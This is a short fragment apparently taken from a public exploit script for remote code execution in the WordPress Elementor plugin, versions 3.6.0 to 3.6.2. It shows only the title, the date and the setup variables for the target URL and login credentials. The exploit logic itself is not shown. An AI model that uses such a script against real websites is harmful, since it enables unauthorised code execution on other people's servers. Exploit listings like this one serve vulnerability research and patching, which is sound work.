...
# Exploit Title: WP Elementor 3.6.0/1/2 Remote Code Execution
# Google Dork: none
# Date: April 16 2022
...
baseUrl = 'http://192.168.120.130:8000/' # Change this with the base url of the target
username = 'a2' # Change this with the username you want to use to log in
password = 'aaaaaa' # Change this with the password you want to use to log in
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
